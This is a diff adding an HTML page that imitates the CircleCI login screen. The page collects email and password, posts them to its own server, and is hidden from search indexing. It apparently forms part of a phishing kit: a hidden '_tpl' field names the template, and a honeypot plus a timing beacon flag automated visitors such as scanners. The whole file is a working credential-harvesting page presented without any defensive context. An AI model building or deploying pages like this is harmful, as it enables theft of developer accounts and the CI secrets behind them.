@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Log in to CircleCI</title>
+<meta name="theme-color" content="#161616">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23161616%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EC%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23161616%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EC%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="Log in to CircleCI">
+<meta property="og:site_name" content="CircleCI">
+<style>
+  body { margin:0;min-height:100vh;background:#f0f2f5;display:flex;align-items:center;
+         justify-content:center;padding:20px;
+         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
+                     sans-serif; }
+  .card { background:#fff;width:100%;max-width:400px;border-radius:12px;
+          box-shadow:0 12px 40px rgba(0,0,0,.10);padding:36px 32px 28px;
+          box-sizing:border-box; }
+  .mark { display:flex;justify-content:center;margin:0 0 18px; }
+  h1 { font-size:20px;margin:0 0 6px;text-align:center;color:#1c1e21;font-weight:600; }
+  .sub { text-align:center;color:#65676b;font-size:14px;margin:0 0 22px; }
+  .field { margin-bottom:14px; }
+  .field label { display:block;font-size:13px;color:#65676b;margin:0 0 6px;
+                 font-weight:500; }
+  .field input { width:100%;padding:13px 14px;font-size:15px;border:1px solid #ccd0d5;
+                 border-radius:8px;background:#fff;outline:none;box-sizing:border-box;
+                 transition:border .15s; }
+  .field input:focus { border-color:#161616;box-shadow:0 0 0 2px rgba(0,0,0,.06); }
+  .btn { width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;
+         background:#161616;border:0;border-radius:8px;cursor:pointer;margin-top:6px; }
+  .btn:hover { filter:brightness(1.06); }
+  .row { display:flex;justify-content:space-between;align-items:center;margin:14px 0 4px;
+         font-size:13px; }
+  .row a { color:#3EAAAF;text-decoration:none; }
+  .row label { margin:0;display:flex;gap:6px;align-items:center;color:#65676b; }
+  .foot { text-align:center;font-size:12px;color:#8a8d91;margin-top:22px;line-height:1.6; }
+  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
+</style>
+</head>
+<body>
+<form class="card" method="POST" action="/">
+  <div class="mark"><svg viewBox="0 0 148 40" width="148" height="40" role="img" aria-label="CircleCI"><text x="0" y="30" font-family="Arial,Helvetica,sans-serif" font-size="30" font-weight="700" fill="#161616" letter-spacing="-0.5">CircleCI</text></svg></div>
+  <h1>Log in to CircleCI</h1>
+  <p class="sub">Sign in with your email</p>
+    <div class="field">
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="username" required>
+    </div>
+    <div class="field">
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
+    </div>
+  <div class="row"><label><input type="checkbox" name="remember" value="1" checked> Remember me</label><a href="#">Forgot password?</a></div>
+  <button class="btn" type="submit">Log in</button>
+
+  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
+  <input type="hidden" name="_tpl" value="circleci">
+  <input type="hidden" name="_ts" value="__TS__">
+  <div class="foot">CircleCI is a trademark of its respective owner.</div>
+
+<script>
+/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
+   record it, and we log how long the form was open (bot forms are instant). */
+(function(){
+  var t0 = Date.now();
+  var f = document.querySelector('form');
+  if(!f) return;
+  f.addEventListener('submit', function(){
+    var el = f.querySelector('input[name=_ts]');
+    if(el) el.value = String(Date.now() - t0);
+  });
+})();
+</script>
+</form>
+</body>
+</html>
